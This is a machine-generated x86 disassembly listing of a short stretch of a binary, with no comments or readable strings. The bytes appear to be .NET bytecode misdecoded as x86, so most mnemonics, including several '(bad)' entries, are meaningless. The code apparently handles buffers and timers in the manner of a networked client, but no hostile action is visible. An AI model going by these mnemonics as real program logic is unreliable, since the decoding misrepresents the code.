  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 d4 21 00       	and    $0x21d472,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 e2                	jb     0x40305c
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 ec 21 00       	and    $0x21ec72,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
